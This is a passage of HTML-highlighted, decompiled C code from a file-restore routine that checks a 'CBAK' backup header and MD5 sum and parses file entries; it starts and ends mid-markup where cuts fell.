plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> file_info_count</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// [rsp+14h] [rbp-DCh]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> min_data_offset</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// [rsp+18h] [rbp-D8h]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> i</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// [rsp+1Ch] [rbp-D4h]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    restore_files</span><span class="token operator" style="color:#393A34">::</span><span class="token plain">FileInfo </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">file_info_list</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// [rsp+20h] [rbp-D0h]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    FILE </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">backup_file</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// [rsp+28h] [rbp-C8h]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">signed</span><span class="token plain"> __int64 backup_file_size</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// [rsp+30h] [rbp-C0h]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">unsigned</span><span class="token plain"> __int8 </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">backup_file_buffer</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// [rsp+38h] [rbp-B8h]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    restore_files</span><span class="token operator" style="color:#393A34">::</span><span class="token plain">FileInfo </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">info_0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// [rsp+48h] [rbp-A8h]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">unsigned</span><span class="token plain"> __int8 </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">encrypted_data</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// [rsp+50h] [rbp-A0h]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name">size_t</span><span class="token plain"> data_length</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// [rsp+58h] [rbp-98h]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">unsigned</span><span class="token plain"> __int8 </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">decrypted_data</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// [rsp+60h] [rbp-90h]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    FILE </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">output_file</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// [rsp+68h] [rbp-88h]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    restore_files</span><span class="token operator" style="color:#393A34">::</span><span class="token plain">FileInfo info</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// [rsp+70h] [rbp-80h] BYREF</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> version</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">9</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// [rsp+97h] [rbp-59h] BYREF</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">unsigned</span><span class="token plain"> __int8 stored_md5_sum</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">16</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// [rsp+A0h] [rbp-50h] BYREF</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">unsigned</span><span class="token plain"> __int8 calculated_md5_sum</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">16</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// [rsp+B0h] [rbp-40h] BYREF</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> log_file_name</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">21</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// [rsp+C0h] [rbp-30h] BYREF</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">unsigned</span><span class="token plain"> __int64 v24</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// [rsp+D8h] [rbp-18h]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    v24 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">__readfsqword</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x28u</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    backup_file </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">fopen</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">backup_file_path</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"rb"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">backup_file</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">fseek</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">backup_file</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0LL</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        backup_file_size </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">ftell</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">backup_file</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">fseek</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">backup_file</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0LL</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        backup_file_buffer </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">unsigned</span><span class="token plain"> __int8 </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token function" style="color:#d73a49">malloc</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">backup_file_size</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">backup_file_buffer</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">fread</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">backup_file_buffer</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1uLL</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> backup_file_size</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> backup_file</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> backup_file_size </span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token function" style="color:#d73a49">fclose</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">backup_file</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">!</span><span class="token function" style="color:#d73a49">memcmp</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">backup_file_buffer</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"CBAK"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">4uLL</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    v1 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_QWORD </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">backup_file_buffer </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">12</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_QWORD </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">stored_md5_sum </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_QWORD </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">backup_file_buffer </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">4</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_QWORD </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">stored_md5_sum</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">8</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> v1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    </span><span class="token function" style="color:#d73a49">calculate_md5</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">backup_file_buffer </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">20</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> backup_file_size </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">20</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> calculated_md5_sum</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">!</span><span class="token function" style="color:#d73a49">memcmp</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">stored_md5_sum</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> calculated_md5_sum</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x10uLL</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        </span><span class="token function" style="color:#d73a49">memset</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">version</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">sizeof</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">version</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_QWORD </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">version </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_QWORD </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">backup_file_buffer </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">20</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        </span><span class="token function" style="color:#d73a49">memset</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">log_file_name</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">sizeof</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">log_file_name</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        </span><span class="token function" style="color:#d73a49">memcpy</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">log_file_name</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> backup_file_buffer </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">28</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x14uLL</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        offset </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">48</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        file_info_list </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0LL</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        file_info_count </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        min_data_offset </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> backup_file_size</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        </span><span class="token keyword" style="color:#00009f">while</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">offset </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> min_data_offset </span><span class="token operator" style="color:#393A34">&amp;&amp;</span><span class="token plain"> backup_file_size</span><span class="token operator" style="color:#393A34">&gt;=</span><span class="token plain"> offset </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">32</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            </span><span class="token function" style="color:#d73a49">memset</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">info</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">sizeof</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">info</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            </span><span class="token function" style="color:#d73a49">memcpy</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">info</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">backup_file_buffer</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">offset</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x18uLL</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            info</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">filename</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">24</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            offseta </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> offset </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">24</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            info</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">file_size </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_DWORD </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">backup_file_buffer</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">offseta</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            offseta </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">4</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            info</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">file_offset </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_DWORD </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">backup_file_buffer</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">offseta</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            offset </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> offseta </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">4</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">min_data_offset</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> info</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">file_offset </span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                min_data_offset </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> info</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">file_offset</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            file_info_list </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">restore_files</span><span class="token operator" style="color:#393A34">::</span><span class="token plain">FileInfo </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token function" style="color:#d73a49">realloc</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">file_info_list</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">36LL</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">file_info_count </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">!</span><span class="token plain">file_info_list</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                </span><span class="token function" style="color:#d73a49">puts</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">byte_425A</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                </span><span class="token function" style="color:#d73a49">free</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">backup_file_buffer</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                </span><span class="token keyword" style="color:#00009f">return</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            v2 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">file_info_list</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">file_info_count</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            v3 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_QWORD </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">info</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">filename</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">8</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_QWORD </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">v2</span><span class="token operator" style="color:#393A34">-&gt;</span><span class="token plain">filename </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_QWORD </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">info</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">filename</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_QWORD </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">v2</span><span class="token operator" style="color:#393A34">-&gt;</span><span class="token plain">filename</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">8</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> v3</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            v4 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_QWORD </span><span class="token operator" 